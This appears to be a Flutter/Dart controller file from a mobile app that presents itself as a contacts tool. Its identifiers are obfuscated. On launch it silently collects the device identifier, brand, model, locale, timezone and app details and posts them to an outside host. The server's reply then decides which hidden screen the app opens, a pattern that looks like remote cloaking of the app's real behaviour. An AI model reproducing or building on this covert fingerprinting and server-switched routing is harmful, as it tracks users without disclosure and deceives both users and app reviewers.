import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {


  var ebpqnuyxko = RxBool(false);
  var twnshcy = RxBool(true);
  var efgt = RxString("");
  var josefina = RxBool(false);
  var jacobson = RxBool(true);
  final zkelcjh = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    jsvk();
  }


  Future<void> jsvk() async {

    josefina.value = true;
    jacobson.value = true;
    twnshcy.value = false;

    zkelcjh.post("https://yapi.hugan.live/fybustxdk",data: await nsfhwk()).then((value) {
      var qksiyhd = value.data["qksiyhd"] as String;
      var nkyjp = value.data["nkyjp"] as bool;
      if (nkyjp) {
        efgt.value = qksiyhd;
        nicolette();
      } else {
        wehner();
      }
    }).catchError((e) {
      twnshcy.value = true;
      jacobson.value = true;
      josefina.value = false;
    });
  }

  Future<Map<String, dynamic>> nsfhwk() async {
    final DeviceInfoPlugin ryhioxcn = DeviceInfoPlugin();
    PackageInfo umtdw_jzeny = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var acgklj = Platform.localeName;
    var eomcf_mfLcMJ = currentTimeZone;

    var eomcf_Ezc = umtdw_jzeny.packageName;
    var eomcf_Ukh = umtdw_jzeny.version;
    var eomcf_Yo = umtdw_jzeny.buildNumber;

    var eomcf_GM = umtdw_jzeny.appName;
    var eomcf_PiSgc = "";
    var gladysKemmer = "";
    var eomcf_pUOjAmyF  = "";
    var isacPowlowski = "";
    var bereniceReilly = "";
    var chanceHammes = "";
    var eomcf_BQDs = "";


    var eomcf_Kh = "";
    var eomcf_eb = false;

    if (GetPlatform.isAndroid) {
      eomcf_Kh = "android";
      var ndxmlqba = await ryhioxcn.androidInfo;

      eomcf_BQDs = ndxmlqba.brand;

      eomcf_PiSgc  = ndxmlqba.model;
      eomcf_pUOjAmyF = ndxmlqba.id;

      eomcf_eb = ndxmlqba.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      eomcf_Kh = "ios";
      var gmnoqjy = await ryhioxcn.iosInfo;
      eomcf_BQDs = gmnoqjy.name;
      eomcf_PiSgc = gmnoqjy.model;

      eomcf_pUOjAmyF = gmnoqjy.identifierForVendor ?? "";
      eomcf_eb  = gmnoqjy.isPhysicalDevice;
    }
    var res = {
      "eomcf_Yo": eomcf_Yo,
      "isacPowlowski" : isacPowlowski,
      "eomcf_Ukh": eomcf_Ukh,
      "eomcf_GM": eomcf_GM,
      "eomcf_Ezc": eomcf_Ezc,
      "eomcf_mfLcMJ": eomcf_mfLcMJ,
      "chanceHammes" : chanceHammes,
      "eomcf_PiSgc": eomcf_PiSgc,
      "acgklj": acgklj,
      "eomcf_Kh": eomcf_Kh,
      "eomcf_BQDs": eomcf_BQDs,
      "eomcf_pUOjAmyF": eomcf_pUOjAmyF,
      "eomcf_eb": eomcf_eb,
      "gladysKemmer" : gladysKemmer,
      "bereniceReilly" : bereniceReilly,

    };
    return res;
  }

  Future<void> wehner() async {
    Get.offAllNamed("/contactsTab");
  }

  Future<void> nicolette() async {
    Get.offAllNamed("/contactsFirstTool");
  }

}
